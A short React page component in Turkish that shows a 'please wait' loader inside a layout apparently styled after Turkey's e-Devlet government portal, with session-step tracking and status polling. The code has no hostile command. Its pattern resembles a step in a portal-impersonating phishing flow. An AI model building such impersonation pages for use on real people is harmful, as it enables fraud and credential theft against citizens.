import EdevletLayout from '../components/EdevletLayout';
import useStatusPolling from '../lib/hooks/useStatusPolling';
import useSessionStep from '../lib/hooks/useSessionStep';

export default function BekleyinizPage() {
  const session = useSessionStep('Bekleme Sayfası');
  useStatusPolling();

  if (!session.loading && !session.active) {
    return (
      <EdevletLayout richText="İşleminiz bulunamadı.">
        <p>Bu ekranı görebilmek için önce ana formu doldurmanız gerekir.</p>
      </EdevletLayout>
    );
  }

  return (
    <EdevletLayout>
      <fieldset>
        <div className="loader" style={{ display: 'flex' }}>
          <img src="/assets/img/form-progress.svg" alt="..." />İşleminiz devam ediyor. Lütfen bekleyiniz...
        </div>
      </fieldset>
    </EdevletLayout>
  );
}